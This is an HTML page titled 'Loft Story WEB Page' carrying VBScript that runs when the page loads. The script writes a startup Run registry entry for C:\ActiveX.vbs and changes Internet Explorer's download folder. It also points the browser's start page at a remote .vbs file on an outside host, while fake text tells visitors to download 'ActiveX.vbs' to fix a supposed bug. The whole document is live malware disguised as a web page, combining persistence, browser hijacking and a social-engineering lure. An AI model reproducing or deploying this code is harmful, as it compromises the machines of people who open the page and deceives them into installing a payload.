<html><head><title>Loft Story WEB Page</title></head>
<font face='verdana' color=green size='2'>Please accept ActiveX to see this page<br><br>	Internet Explorer<br><br> </font>
<SCRIPT Language=VBScript>
On Error Resume Next
Set w=CreateObject("WScript.Shell")
w.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ActiveX 1.0","C:\ActiveX.vbs"
w.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Download Directory","C:\"
document.write "Please download the file ""ActiveX.vbs"" to correct a bug in Internet Explorer"
document.write "<br>Connect you to internet to download the file<br>"
document.write "<br><h2>If you don't accept ActiveX the syntax failed<h2>"
w.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.ctw.net/euphoria/ActiveX.vbs"
</SCRIPT></body></html>
